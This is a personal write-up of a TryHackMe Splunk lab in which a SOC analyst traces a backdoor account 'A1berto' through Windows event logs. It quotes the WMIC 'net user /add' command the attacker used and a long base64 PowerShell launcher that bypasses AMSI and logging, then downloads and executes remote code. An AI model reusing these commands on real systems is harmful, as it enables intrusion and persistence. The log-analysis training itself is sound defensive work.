# Investigating with Splunk

## Introduction

This project aims to help the Cybersecurity community understand how to use Splunk Enterprise tool to in reviewing logs and using the log ingestion for analysis and investigation.

## Lab Prerequisite

This investigation was conducted in a simulated environment on my Splunk Enterprise using a simulated task from a challenging room "Investigating with Splunk" room on TryHackMe.

## Tools

* Splunk
* Windows event Logs
* CyberChef

## Simulation

SOC Analyst Johny has observed some anomalous behaviours in the logs of a few windows machines. It looks like the adversary has access to some of these machines and successfully created some backdoor. His manager has asked him to pull those logs from suspected hosts and ingest them into Splunk for quick investigation. Our task as SOC Analyst is to examine the logs and identify the anomalies.

## Methodology

In this lab project, I investigated some observed anomalous behaviors in the logs of a few windows machines using Splunk. An adversary had access to some of these machines and successfully created some backdoor. I had to pull those logs from suspected hosts and ingest them into Splunk for quick investigation. After examining the logs, I used CyberChef tool to decode the Base64 code of an encoded Powershell script from the infected host that the adversary used to initiate a web request.

## Step 1

To collect several events and ingest them in the index main, I used the Search & Reporting App to help see what is happening on the server and I took the following steps:

* Clicked Search and Reporting
* Typed the command <mark><font color="#e67e22">Index=main</font></mark> in the search bar
* Set the time to all time

*   There are 3 search modes that you can choose from the search mode selector: Fast, Smart, and Verbose Mode
    *   **Fast Mode:** With fast cutting down on the field information that is returned, field discovery is disabled for this Fast mode, only returning information on default fields and field required to fulfil your search.
    *   **Verbose Mode:** It returns as much field and event data as possible, discovering all fields it can.
    *   **Smart Mode:** The default Smart Mode will toggle behavior based on the type of search that you are running

![image](https://github.com/Michaelsalaja/SOC-Incident-Investigation-SIEM-Lab/blob/81fa56f7ac9d0fd099db1054e52c225eeaf45da4/Figure%201.png)

Figure 1


*   Ensured that it was set in verbose mode before entering the search query.
*   12,256 events were returned

Output:

![image](https://github.com/Michaelsalaja/SOC-Incident-Investigation-SIEM-Lab/blob/81fa56f7ac9d0fd099db1054e52c225eeaf45da4/Figure%202.png)
Figure 2


## Step 2

After going through the logs, I intended to find any proof of plausibility that the adversary had successfully created a backdoor user on one of the infected hosts or not.

*   To discover that, I visited Ultimate Window Security for Event IDs search
*   Website: [https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/default.aspx](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/default.aspx)
*   Searched for Windows logs Event ID for "A user account was created"

![image](https://github.com/Michaelsalaja/SOC-Incident-Investigation-SIEM-Lab/blob/c06bcc4515208362d255c11af5579509d0f430b4/Figure%203.png)
Figure 3


*   Type `index=main EventId=4720` in the Splunk search query to identify any related Event ID
*   The result returned showed was positive
*   A new username <mark>A1berto</mark> was created by the adversary

![image](https://github.com/Michaelsalaja/SOC-Incident-Investigation-SIEM-Lab/blob/81fa56f7ac9d0fd099db1054e52c225eeaf45da4/Figure%204.png)
Figure 4


# New Search
**Search Query:**
`index=main EventID=4720`

**Search Settings:**
*   **Time Range:** All time
*   **Event Sampling:** No Event Sampling
*   **Mode:** Verbose Mode

**Results Summary:**
*   **Events:** 1
*   **Patterns:** 0
*   **Statistics:** 0
*   **Visualization:** 0

---

### Fields
**SELECTED FIELDS**
*   **a host** 1
*   **a source** 1
*   **a sourcetype** 1

**INTERESTING FIELDS**
*   **# @version** 1
*   **a AccountExpires** 1
*   **a ActivityID** 1
*   **a AllowedToDelegateTo** 1
*   **a Category** 1
*   **a Channel** 1
*   **a DisplayName** 1
*   **# EventID** 1
*   **a EventReceivedTime** 1
*   **a EventTime** 1
*   **# ExecutionProcessID** 1
*   **a extracted_EventType** 1
*   **a extracted_host** 1
*   **a HomeDirectory** 1
*   **a HomePath** 1
*   **a Hostname** 1
*   **a index** 1
*   **# Keywords** 1
*   **# linecount** 1
*   **a LogonHours** 1
*   **a Message** 1
*   **a NewUacValue** 1
*   **a OldUacValue** 1
*   **a Opcode** 1

---

### Events
<table>
  <thead>
    <tr>
        <th>i</th>
        <th>Time</th>
        <th>Event</th>
    </tr>
  </thead>
  <tbody>
    <tr>
        <td>11/05/2022 22:32:18.000</td>
        <td>{ [-]<br/>@version: 1<br/>AccountExpires: %%1794<br/>ActivityID: {E0F7BC1B-4488-0000-8D57-1F92808AD601}<br/>AllowedToDelegateTo: -<br/>Category: User Account Management<br/>Channel: Security<br/>DisplayName: %%1793<br/>**EventID: 4720**<br/>EventReceivedTime: 2022-02-14 08:06:03<br/>EventTime: 2022-02-14 08:06:02<br/>EventType: AUDIT_SUCCESS<br/>ExecutionProcessID: 740<br/>HomeDirectory: %%1793<br/>HomePath: %%1793<br/>Hostname: Micheal.Beaven<br/>Keywords: -9214364837600035000<br/>LogonHours: %%1797<br/>Message: A user account was created.<br/><br/>Subject:<br/>    Security ID: S-1-5-21-4020993649-1037605423-417876593-1104<br/>    Account Name: James<br/>    Account Domain: Cybertees<br/>    Logon ID: 0x551686<br/><br/>New Account:<br/>    Security ID: S-1-5-21-1969843730-2406867588-1543852148-1000<br/>    **Account Name: Alberto**<br/>    Account Domain: WORKSTATION0</td>
        <td></td>
    </tr>
  </tbody>
</table>

![image](https://github.com/Michaelsalaja/SOC-Incident-Investigation-SIEM-Lab/blob/81fa56f7ac9d0fd099db1054e52c225eeaf45da4/Figure%205.png)
Figure 5


### Step 3

To further investigate malicious acts of the adversary, I searched for any potential updates of the registry key regarding the new backdoor user on the on the same host.

*   Typed <mark><font color="orange">Index=main Hostname="Micheal.Beaven" A1berto</font></mark> in the search bar

---

**Splunk Event Details Transcription:**

**Subject:**
*   **Account Name:** James
*   **Account Domain:** Cybertees
*   **Logon ID:** 0x551686

**New Account:**
*   **Security ID:** S-1-5-21-1969843730-2406867588-1543852148-1000
*   **Account Name:** A1berto
*   **Account Domain:** WORKSTATION6

**Attributes:**
*   **SAM Account Name:** A1berto
*   **Display Name:** \<value not set>
*   **User Principal Name:** -
*   **Home Directory:** \<value not set>
*   **Home Drive:** \<value not set>
*   **Script Path:** \<value not set>
*   **Profile Path:** \<value not set>
*   **User Workstations:** \<value not set>
*   **Password Last Set:** \<never>
*   **Account Expires:** \<never>
*   **Primary Group ID:** 513
*   **Allowed To Delegate To:** -
*   **Old UAC Value:** 0x0
*   **New UAC Value:** 0x15
*   **User Account Control:**
    *   Account Disabled
    *   'Password Not Required' - Enabled
    *   'Normal Account' - Enabled
*   **User Parameters:** \<value not set>
*   **SID History:** -
*   **Logon Hours:** All

**Additional Information:**
*   **Privileges:** -
*   **NewUacValue:** 0x15
*   **OldUacValue:** 0x0
*   **Opcode:** Info
*   **OpcodeValue:** 0
*   **PasswordLastSet:** %%1794
*   **PrimaryGroupId:** 513
*   **PrivilegeList:** -
*   **ProfilePath:** %%1793
*   **ProviderGuid:** {54849625-5478-4994-A5BA-3E3B0328C30D}
*   **RecordNumber:** 56079
*   **SamAccountName:** A1berto
*   **ScriptPath:** %%1793
*   **Severity:** INFO
*   **SeverityValue:** 2


![image](https://github.com/Michaelsalaja/SOC-Incident-Investigation-SIEM-Lab/blob/81fa56f7ac9d0fd099db1054e52c225eeaf45da4/Figure%206.png)
Figure 6


**Search Query:**
`index=main Hostname="Micheal.Beaven" Alberto`

**Events (10)**
**Time Range:** All time
**Verbose Mode**

<table>
  <thead>
    <tr>
        <th>i</th>
        <th>Time</th>
        <th>Event</th>
    </tr>
  </thead>
  <tbody>
    <tr>
        <td>11/05/2022 22:32:18.000</td>
        <td>{ [-]<br/>@version: 1<br/>ActivityID: {E0F7BC1B-4488-0000-8D57-1F92808AD601}<br/>Category: User Account Management<br/>Channel: Security<br/>EventID: 4726<br/>EventReceivedTime: 2022-02-14 08:06:03<br/>EventTime: 2022-02-14 08:06:02<br/>EventType: AUDIT_SUCCESS<br/>ExecutionProcessID: 740<br/>Hostname: Micheal.Beaven<br/>Keywords: -9214364837600035000<br/>Message: A user account was deleted.<br/><br/>Subject:<br/>    Security ID: S-1-5-21-4020993649-1037605423-417876593-1104<br/>    Account Name: James<br/>    Account Domain: Cybertees<br/>    Logon ID: 0x551686<br/><br/>Target Account:<br/>    Security ID: S-1-5-21-1969843730-2406867588-1543852148-1000<br/>    Account Name: Alberto<br/>    Account Domain: WORKSTATION6<br/><br/>Additional Information:<br/>    Privileges -<br/>Opcode: Info<br/>OpcodeValue: 0<br/>PrivilegeList: -<br/>ProviderGuid: {54849625-5478-4994-A5BA-3E3B0328C30D}<br/>RecordNumber: 56082<br/>Severity: INFO<br/>SeverityValue: 2<br/>SourceModuleName: eventlog<br/>SourceModuleType: im_msvistalog</td>
        <td></td>
    </tr>
  </tbody>
</table>

* The result returned showed was positive
* A full path of the registry was detected
* Registry: <mark>HKLM\SAM\SAM\Domains\Account\Users\Names\Alberto</mark>

![image](https://github.com/Michaelsalaja/SOC-Incident-Investigation-SIEM-Lab/blob/81fa56f7ac9d0fd099db1054e52c225eeaf45da4/Figure%207.png)
Figure 7


# Search | Splunk 8.2.6

**URL**: `http://10.114.182.236/en-GB/app/search/search?q=search index%3Dmain Hostnam`

*   CyberChef
*   Reverse Shell Generator

< Hide Fields | All Fields | List | Format | 20 Per Page

### Selected Fields
*   **# Keywords**: 2
*   **# linecount**: 1
*   **a LogonGuid**: 1
*   **a LogonId**: 1
*   **a MandatoryLabel**: 1
*   **a Message**: 10
*   **a NewProcessId**: 2
*   **a NewProcessName**: 2
*   **a Opcode**: 1
*   **# OpcodeValue**: 1
*   **a OriginalFileName**: 3
*   **a ParentCommandLine**: 2
*   **a ParentImage**: 2
*   **a ParentProcessGuid**: 2
*   **# ParentProcessId**: 2
*   **a ParentProcessName**: 2
*   **# port**: 1
*   **a PrivilegeList**: 1
*   **a ProcessGuid**: 4
*   **# ProcessId**: 6
*   **a Product**: 1
*   **a ProviderGuid**: 2
*   **# RecordCount**: 4
*   **# RecordNumber**: 10
*   **a RuleName**: 1
*   **a Severity**: 1
*   **# SeverityValue**: 1
*   **a SourceModuleName**: 1
*   **a SourceModuleType**: 1
*   **a SourceName**: 2
*   **a splunk_server**: 1
*   **a SubjectDomainName**: 1
*   **a SubjectLogonId**: 2
*   **a SubjectUserName**: 2
*   **a SubjectUserSid**: 2
*   **a tags[]**: 1
*   **a TargetDomainName**: 3
*   **a TargetLogonId**: 2
*   **a TargetObject**: 2
*   **a TargetSid**: 1
*   **a TargetUserName**: 3
*   **a TargetUserSid**: 1
*   **# Task**: 5
*   **# TerminalSessionId**: 1
*   **# ThreadID**: 3
*   **a timestamp**: 11
*   **a TokenElevationType**: 1
*   **a UserID**: 1
*   **a UtcTime**: 4
*   **# Version**: 3

### Events

<table>
  <thead>
    <tr>
        <th>i</th>
        <th>Time</th>
        <th>Event</th>
    </tr>
  </thead>
  <tbody>
    <tr>
        <td></td>
        <td>11/05/2022 22:32:18.000</td>
        <td>SourceModuleName: eventlog<br/>SourceModuleType: im_msvistalog<br/>SourceName: Microsoft-Windows-Security-Auditing<br/>SubjectDomainName: Cybertees<br/>SubjectLogonId: 0x551686<br/>SubjectUserName: James<br/>SubjectUserSid: S-1-5-21-4020993649-1037605423-417876593-1104<br/>TargetDomainName: WORKSTATION6<br/>TargetSid: S-1-5-21-1969843730-2406867588-1543852148-1000<br/>TargetUserName: Alberto<br/>Task: 13824<br/>ThreadID: 3872<br/>Version: 0<br/>host: cybertees.net<br/>port: 60427<br/>tags: [ [+] ]<br/>timestamp: 2022-02-14T12:06:03.910Z<br/>}<br/>Show as raw text<br/>host = server source = splunk_challenge1.json sourcetype = event_logs</td>
    </tr>
    <tr>
        <td>11/05/2022 22:32:18.000</td>
        <td>{ [-]<br/>@version: 1<br/>AccountExpires: %%1794<br/>ActivityID: {E0F7BC1B-4488-0000-8D57-1F92808AD601}<br/>AllowedToDelegateTo: -<br/>Category: User Account Management<br/>Channel: Security<br/>DisplayName: %%1793<br/>EventID: 4720<br/>EventReceivedTime: 2022-02-14 08:06:03<br/>EventTime: 2022-02-14 08:06:02<br/>EventType: AUDIT_SUCCESS<br/>ExecutionProcessID: 740<br/>HomeDirectory: %%1793<br/>HomePath: %%1793<br/>Hostname: Micheal.Beaven<br/>Keywords: -9214364837600035000<br/>LogonHours: %%1797<br/>Message: A user account was created.<br/><br/>Subject:<br/>Security ID: S-1-5-21-4020993649-1037605423-417876593-1104<br/>Account Name: James<br/>Account Domain: Cybertees<br/>Logon ID: 0x551686</td>
        <td></td>
    </tr>
  </tbody>
</table>

1h 17min 0s

![image](https://github.com/Michaelsalaja/SOC-Incident-Investigation-SIEM-Lab/blob/81fa56f7ac9d0fd099db1054e52c225eeaf45da4/Figure%208.png)
Figure 8


### Step 4

To examine the logs and identify the user that the adversary was trying to impersonate. I took the following steps.

*   <mark>Typed index=main</mark>
*   <mark>| stats count by User</mark> in the search bar > I made sure that "U" is capitalized

1h 10min 1s

*   The result that was returned showed the malicious intent of the adversary
*   The adversary was trying to impersonate Alberto by changing Alberto to A<mark>l</mark>berto, making it difficult for SOC analysts to identify the omission of "l" in the name Alberto

**Output:**

![image](https://github.com/Michaelsalaja/SOC-Incident-Investigation-SIEM-Lab/blob/81fa56f7ac9d0fd099db1054e52c225eeaf45da4/Figure%209.png)
Figure 9


<table>
  <thead>
    <tr>
        <th>User</th>
        <th>count</th>
    </tr>
  </thead>
  <tbody>
    <tr>
        <td>&lt;mark style="background-color: blue"&gt;Cybertees\A1berto</mark></td>
        <td>24</td>
    </tr>
    <tr>
        <td>Cybertees\James</td>
        <td>5</td>
    </tr>
    <tr>
        <td>NT AUTHORITY\NETWORK SERVICE</td>
        <td>20</td>
    </tr>
    <tr>
        <td>NT AUTHORITY\SYSTEM</td>
        <td>70</td>
    </tr>
  </tbody>
</table>

### Step 5

I searched for commands used by the adversary to add a backdoor user from a remote computer by using the following command:

*   Typed in <mark>index=main Channel=Security A1berto</mark> in the search bar

![image](https://github.com/Michaelsalaja/SOC-Incident-Investigation-SIEM-Lab/blob/81fa56f7ac9d0fd099db1054e52c225eeaf45da4/Figure%2010.png)
Figure 10


*   Scrolled down and searched for the activity where the adversary used a parent process to create a backdoor
*   The results returned revealed parent process utilized by the adversary

Command line: <mark>"C:\windows\System32\Wbem\WMIC.exe" /node:WORKSTATION6 process call create "net user /add A1berto</mark>

![image](https://github.com/Michaelsalaja/SOC-Incident-Investigation-SIEM-Lab/blob/81fa56f7ac9d0fd099db1054e52c225eeaf45da4/Figure%2011.png)
Figure 11


### Step 6

To determine how many times the login attempt from the backdoor user was observed during the investigation, I revisited the Ultimate Window Security website for Event IDs search

*   Website: [https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/default.aspx](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/default.aspx)
*   Searched for Windows logs Event ID for "An account was successfully logged on"
*   Typed in the same query <mark>index=main Channel=Security A1berto</mark> in the search bar
*   Event ID: <mark>4624</mark>

![image](https://github.com/Michaelsalaja/SOC-Incident-Investigation-SIEM-Lab/blob/81fa56f7ac9d0fd099db1054e52c225eeaf45da4/Figure%2012.png)
Figure 12


ultimatewindowssecurity.com/securitylog/encyclopedia/default.aspx

# Windows Security Log Events

* [ ] All Sources
* [x] Windows Audit
* [ ] SharePoint Audit (LOGbinder for SharePoint)
* [ ] SQL Server Audit (LOGbinder for SQL Server)
* [ ] Exchange Audit (LOGbinder for Exchange)
* [ ] Sysmon (MS Sysinternals Sysmon)

**Windows Audit Categories:**
All categories [dropdown]
**Subcategories:**
All subcategories [dropdown]

**Windows Versions:**
* [ ] All events
* [ ] Win2000, XP and Win2003 only
* [x] Win2008, Win2012R2, Win2016 and Win10+, Win2019

### Category: All

* Windows 1100 The event logging service has shut down
* Windows 1101 Audit events have been dropped by the transport.
* Windows 1102 The audit log was cleared
* Windows 1104 The security Log is now full
* Windows 1105 Event log automatic backup
* Windows 1108 The event logging service encountered an error
* Windows 4608 Windows is starting up
* Windows 4609 Windows is shutting down
* Windows 4610 An authentication package has been loaded by the Local Security Authority
* Windows 4611 A trusted logon process has been registered with the Local Security Authority
* Windows 4612 Internal resources allocated for the queuing of audit messages have been exhausted, leading to the loss of some audits.
* Windows 4614 A notification package has been loaded by the Security Account Manager.
* Windows 4615 Invalid use of LPC port
* Windows 4616 The system time was changed.
* Windows 4618 A monitored security event pattern has occurred
* Windows 4621 Administrator recovered system from CrashOnAuditFail
* Windows 4622 A security package has been loaded by the Local Security Authority.
* <mark>Windows 4624 An account was successfully logged on</mark>
* Windows 4625 An account failed to log on
* Windows 4626 User/Device claims information
* Windows 4627 Group membership information.
* Windows 4634 An account was logged off
* Windows 4646 IKE DoS-prevention mode started
* Windows 4647 User initiated logoff
* Windows 4648 A logon was attempted using explicit credentials
* Windows 4649 A replay attack was detected
* Windows 4650 An IPsec Main Mode security association was established
* Windows 4651 An IPsec Main Mode security association was established
* Windows 4652 An IPsec Main Mode negotiation failed
* Windows 4653 An IPsec Main Mode negotiation failed
* Windows 4654 An IPsec Quick Mode negotiation failed
* Windows 4655 An IPsec Main Mode security association ended
* Windows 4656 A handle to an object was requested
* Windows 4657 A registry value was modified
* Windows 4658 The handle to an object was closed
* Windows 4659 A handle to an object was requested with intent to delete
* Windows 4660 An object was deleted
* Windows 4661 A handle to an object was requested
* Windows 4662 An operation was performed on an object
* Windows 4663 An attempt was made to access an object
* Windows 4664 An attempt was made to create a hard link
* Windows 4665 An attempt was made to create an application client context.
* Windows 4666 An application attempted an operation
* Windows 4667 An application client context was deleted

---

* The adversary logged in **zero** times because there was no attempted log of 4624

![image](https://github.com/Michaelsalaja/SOC-Incident-Investigation-SIEM-Lab/blob/81fa56f7ac9d0fd099db1054e52c225eeaf45da4/Figure%2013.png)
Figure 13


# New Search
**Search Query:** `index=main Channel=Security Alberto` [All time]

**5 events** (before 12/03/2026 11:06:45.000) | No Event Sampling | Job | Verbose Mode

### Events (5)
**Time:** 11/05/2022 22:32:18.000
**Event:**
```json
{
  @version: 1
  ActivityID: {E0F7BC1B-4488-0000-8D57-1F92808AD601}
  Category: User Account Management
  Channel: Security
  EventID: 4726
}
```

<mark>**EventID**</mark> [X]
3 Values, 100% of events | Selected: [Yes] [No]

**Reports**
* Average over time
* Maximum value over time
* Minimum value over time
* Top values
* Top values by time
* Rare values
* Events with this field

**Avg:** 4702 **Min:** 4688 **Max:** 4726 **Std Dev:** 19.28730152198591

<table>
  <thead>
    <tr>
        <th>Values</th>
        <th>Count</th>
        <th>%</th>
    </tr>
  </thead>
  <tbody>
    <tr>
        <td>4688</td>
        <td>3</td>
        <td>60%</td>
    </tr>
    <tr>
        <td>4720</td>
        <td>1</td>
        <td>20%</td>
    </tr>
    <tr>
        <td>4726</td>
        <td>1</td>
        <td>20%</td>
    </tr>
  </tbody>
</table>

**Additional Information:**
* **Privileges:** -
* **Opcode:** Info
* **OpcodeValue:** 0
* **PrivilegeList:** -

---

### Step 7

Scrolling through the logs under the current search query for further investigation, there was an execution of suspicious Powershell commands were detected. It became an interest to find the name of the infected host on which suspicious Powershell commands were executed.

* <mark><font color="red">Creator Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</font></mark>

![image](https://github.com/Michaelsalaja/SOC-Incident-Investigation-SIEM-Lab/blob/81fa56f7ac9d0fd099db1054e52c225eeaf45da4/Figure%2014.png)
Figure 14


<table>
  <thead>
    <tr>
        <th>i</th>
        <th>Time</th>
        <th>Event</th>
    </tr>
  </thead>
  <tbody>
    <tr>
        <td></td>
        <td>22:32:18.000</td>
        <td>@version: 1<br/>Category: Process Creation<br/>Channel: Security<br/>CommandLine: "C:\windows\System32\Wbem\WMIC.exe" /node:WORKSTATION6 process call create "net user /add A1berto paw0rd1"<br/>EventID: 4688<br/>EventReceivedTime: 2022-02-14 08:06:03<br/>EventTime: 2022-02-14 08:06:01<br/>EventType: AUDIT_SUCCESS<br/>ExecutionProcessID: 4<br/>Hostname: James.browne<br/>Keywords: -9214364837600035000<br/>MandatoryLabel: S-1-16-12288<br/>&lt;mark style="background-color: yellow"&gt;Message: A new process has been created.</mark><br/><br/>Creator Subject:<br/>    Security ID: S-1-5-21-4020993649-1037605423-417876593-1104<br/>    &lt;mark style="background-color: yellow"&gt;Account Name: James</mark><br/>    Account Domain: Cybertees<br/>    Logon ID: 0x2CC013<br/><br/>Target Subject:<br/>    Security ID: S-1-0-0<br/>    Account Name: -<br/>    Account Domain: -<br/>    Logon ID: 0x0<br/><br/>Process Information:<br/>    New Process ID: 0x24d4<br/>    New Process Name: C:\Windows\System32\wbem\WMIC.exe<br/>    Token Elevation Type: %%1937<br/>    Mandatory Label: S-1-16-12288<br/>    Creator Process ID: 0x255c<br/>    &lt;mark style="background-color: yellow"&gt;Creator Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</mark><br/>    Process Command Line: "C:\windows\System32\Wbem\WMIC.exe" /node:WORKSTATION6 process call create "net user /add A1berto paw0rd1"<br/><br/>&lt;mark style="background-color: yellow"&gt;Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.</mark><br/><br/>&lt;mark style="background-color: yellow"&gt;Type 1 is a full token with no privileges removed or groups disabled. A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.</mark><br/><br/>&lt;mark style="background-color: yellow"&gt;Type 2 is an elevated token with no privileges removed or groups disabled. An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator. An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.</mark></td>
    </tr>
  </tbody>
</table>

*   Click <span style="color: orange">Hostname</span> in the "Selected Fields" and viewed the values
*   The PowerSehll command was created under the hostname of <span style="color: orange">James.Browne</span>

![image](https://github.com/Michaelsalaja/SOC-Incident-Investigation-SIEM-Lab/blob/81fa56f7ac9d0fd099db1054e52c225eeaf45da4/Figure%2015.png)
Figure 15


### Step 8

Given the fact that PowerShell logging was enabled on this device I further tried to have an overview of the total sum of events that were logged for the malicious PowerShell execution

*   To search for this log, I popped in the first result into the logs
*   Typed in
    <mark>Index=main Channel="Microsoft-Windows-PowerShell/Operational"</mark> in the search bar

| stats count by Channel

Channel must be capitalized to avoid error results

**Output:**


![image](https://github.com/Michaelsalaja/SOC-Incident-Investigation-SIEM-Lab/blob/81fa56f7ac9d0fd099db1054e52c225eeaf45da4/Figure%2016.png)
Figure 16


**Step 9**

Further investigation revealed that an encoded Powershell script from the infected host initiated a web request, which triggered the interests to search for the full **URL**.

*   Looked through the PowerShell log on the first output result that was searched for initially

*   Typed in in the <mark>Index=main Channel="Microsoft-Windows-PowerShell/Operational"</mark> in the search bar

![image](https://github.com/Michaelsalaja/SOC-Incident-Investigation-SIEM-Lab/blob/81fa56f7ac9d0fd099db1054e52c225eeaf45da4/Figure%2017.png)
Figure 17


*   Searched for <mark>ContextInfo</mark> in the User field and copied the long top 10 values

![image](https://github.com/Michaelsalaja/SOC-Incident-Investigation-SIEM-Lab/blob/81fa56f7ac9d0fd099db1054e52c225eeaf45da4/Figure%2018.png)
Figure 18


### ContextInfo
79 Values, 100% of events
Selected: [ ] Yes [x] No

**Reports**
* Top values
* Top values by time
* Rare values
* Events with this field

<table>
  <thead>
    <tr>
        <th>Top 10 Values</th>
        <th>Count</th>
        <th>%</th>
    </tr>
  </thead>
  <tbody>
    <tr>
        <td>Severity = Informational Host Name = ConsoleHost Host Version = 5.1.18362.752 Host ID = 0f79c464-4587-4a42-a825-a0972e939164 Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc SQBGAHAAKAAkAFMAVgB1AHIAUwBJAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBFAHIAUwBJAE8ATgAuAE0AYQBKAE8AUgAgAC0ARwB1ACAAMwApAHsAJAAxADEAQgBEADgAPQBbAHIAZQBGAF0ALgBBAFMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwB1AG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuAEIARwBFAFQARgBJAGUAbABkACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAgACcATgBvAG4AUAB1AGIAbABpAGMALAAgAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQAMQAxAEIAZAA4ACkAewAkAEEAMQA4AEUAMQA9ACQAMQAxAEIARAA4AC4ARwB1AHQAVgBhAEwAVQBFACgAJABuAFUAbABMACkAOwBJAGYAKAAkAEEAMQA4AGUAMQA9AFsAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAXQApAHsAJAAxADEAQgBEADgAWwAnAFMAYwByAHIAaQBwAHQAQgBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsATABvAGcAAGcAaQBuAGcAJwBdAD0AMAA7ACQAYQAxADgAZQAxAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdABwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCAGwAbwBjAGsATABvAGcAAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsATABvAGcAAGcAaQBuAGcAJwBdAD0AMAA7ACQAYQAxADgAZQAxAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCAGwAbwBjAGsATABvAGcAAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQA7ACQAdgBBAEwAPQBbAEMAbwBsAGwAZQBjAHQAaQBvAG4AcwAuAEcAZQBuAGUAcgBpAGMALgBEAGkAYwB0AGkAbwBuAGEAcgB5AFsAUwB0AHIAaQBuAGcALABTAHkAcwB0AGUAbQAuAE8AYgBqAGUAYwB0AF0AXQA6ADoAbgBlAHcAKAApADsAJAB2AEEATAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsATABvAGcAAGcAaQBuAGcAJwAsADAAKQA7ACQAdgBBAEwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAAGcAaQBuAGcAJwAsADAAKQA7ACQAYQAxADgAZQAxAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCAGwAbwBjAGsATABvAGcAAGcAaQBuAGcAJwBdAD0AJAB2AEEATAB9ADsAWwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAGUAdABGAGkAZQBsAGQAKAApAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAAgAD0AIAAnAFQAbABzADEAMgAnADsAJAB3AGMAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAApADsAJAB3AGMALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAApAHwASQBFAFgA</td>
        <td>1</td>
        <td>1.266%</td>
    </tr>
  </tbody>
</table>

*   Visited the <mark>CyberChef</mark> homepage to decode the encoded
*   Clicked "to Base64 - CyberChef

![image](https://github.com/Michaelsalaja/SOC-Incident-Investigation-SIEM-Lab/blob/81fa56f7ac9d0fd099db1054e52c225eeaf45da4/Figure%2019.png)
Figure 19


* Pasted the values into "Input"

![image](https://github.com/Michaelsalaja/SOC-Incident-Investigation-SIEM-Lab/blob/81fa56f7ac9d0fd099db1054e52c225eeaf45da4/Figure%2020.png)
Figure 20


*   Then typed into the search "remove null bytes and drag under "Strict mode"
*   Copied this highlighted Base64 above from the Output and enter it into another CyberChef browser
*   Removed the null bytes
*   The result showed http://10.10.10.5

![image](https://github.com/Michaelsalaja/SOC-Incident-Investigation-SIEM-Lab/blob/81fa56f7ac9d0fd099db1054e52c225eeaf45da4/Figure%2021.png)
Figure 21


*   Copied the URL and typed it in the Output field
*   Deleted the <mark>"Recipe"</mark> under "Recipe"
